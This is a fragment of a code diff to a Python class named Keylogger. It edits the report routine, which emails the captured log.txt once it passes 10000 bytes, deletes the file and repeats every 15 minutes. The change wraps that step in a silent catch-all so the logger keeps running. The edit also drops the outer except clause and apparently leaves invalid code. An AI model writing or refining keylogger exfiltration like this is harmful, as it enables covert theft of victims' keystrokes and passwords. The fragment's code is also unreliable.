@@ -78,10 +78,11 @@ class Keylogger:
     def report(self):
         try:
             if os.stat('log.txt').st_size > 10000:
-                self.send_mail('log.txt')
-                os.remove('log.txt')
-        except FileNotFoundError:
-            pass
+                try:
+                    self.send_mail('log.txt')
+                    os.remove('log.txt')
+                except:
+                    pass
         thread = threading.Timer(900,self.report)
         thread.start()
             
